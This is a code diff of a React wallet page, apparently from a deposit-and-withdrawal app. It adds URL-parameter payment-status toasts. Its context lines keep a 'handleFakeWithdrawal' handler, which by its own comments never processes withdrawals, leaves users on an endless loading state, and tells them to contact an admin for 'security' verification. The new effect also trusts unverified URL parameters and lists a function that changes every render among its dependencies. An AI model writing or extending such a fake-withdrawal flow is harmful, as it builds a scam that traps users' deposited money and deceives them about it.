@@ -1,4 +1,3 @@
-
 import React, { useState, useEffect } from 'react';
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
 import { Button } from '@/components/ui/button';
@@ -74,14 +73,14 @@ export default function UserWallet() {
 
   const handleFakeWithdrawal = () => {
     setIsWithdrawing(true);
-    
+
     // Show notification immediately that they need to contact admin
     toast({
       title: "Withdrawal Processing",
       description: "For security reasons, withdrawals require manual verification. Please contact admin to process your withdrawal request.",
       variant: "default",
     });
-    
+
     // Keep the loading state active indefinitely
     // No actual withdrawal processing occurs
   };
@@ -89,6 +88,71 @@ export default function UserWallet() {
   const walletBalance = parseFloat(user?.walletBalance || '0');
   const isValidDepositAmount = depositAmount && parseFloat(depositAmount) > 0;
   const isValidWithdrawAmount = withdrawAmount && parseFloat(withdrawAmount) > 0 && parseFloat(withdrawAmount) <= walletBalance;
+
+  // Fetch user data
+  const refetchUser = async () => {
+    try {
+      await refetch();
+    } catch (error) {
+      console.error("Failed to refetch user:", error);
+    }
+  };
+
+  useEffect(() => {
+    const params = new URLSearchParams(window.location.search);
+    const paymentStatus = params.get('status');
+    const paymentMethod = params.get('payment');
+    const trackingId = params.get('tracking_id');
+    const verified = params.get('verified');
+    const error = params.get('error');
+
+    if (paymentStatus && paymentMethod) {
+      if (paymentStatus === 'completed') {
+        toast({
+          title: "Payment Successful",
+          description: `Your ${paymentMethod} payment has been completed successfully.${trackingId ? ` Reference: ${trackingId}` : ''}`,
+        });
+        // Refresh user data to show updated balance
+        if (user?.id) {
+          setTimeout(() => {
+            refetchUser();
+          }, 1000);
+        }
+      } else if (paymentStatus === 'failed') {
+        let errorMsg = `Your ${paymentMethod} payment could not be completed.`;
+        if (error === 'missing_tracking_id') {
+          errorMsg = 'Payment verification failed: Missing tracking information.';
+        } else if (error === 'callback_error') {
+          errorMsg = 'Payment processing error occurred. Please contact support.';
+        }
+
+        toast({
+          title: "Payment Failed",
+          description: errorMsg,
+          variant: "destructive",
+        });
+      } else if (paymentStatus === 'pending') {
+        toast({
+          title: "Payment Pending",
+          description: `Your ${paymentMethod} payment is being processed. Please wait for confirmation.`,
+        });
+      } else if (paymentStatus === 'demo') {
+        toast({
+          title: "Demo Mode",
+          description: `${paymentMethod} payment completed successfully in demo mode.`,
+        });
+      }
+
+      // Clear URL parameters after a short delay
+      setTimeout(() => {
+        window.history.replaceState({}, '', '/dashboard/wallet');
+      }, 3000);
+    }
+
+    if (user?.id) {
+      refetchUser();
+    }
+  }, [user?.id, toast, refetchUser]);
 
   return (
     <div className="max-w-4xl mx-auto p-4 space-y-6">
@@ -332,7 +396,7 @@ export default function UserWallet() {
                         Click below to submit your withdrawal request.
                       </p>
                     </div>
-                    
+
                     <Button 
                       onClick={handleFakeWithdrawal}
                       disabled={isWithdrawing}
@@ -351,7 +415,7 @@ export default function UserWallet() {
                         </>
                       )}
                     </Button>
-                    
+
                     {isWithdrawing && (
                       <div className="mt-4 p-4 bg-blue-50 border border-blue-200 rounded-lg">
                         <div className="flex items-start gap-3">
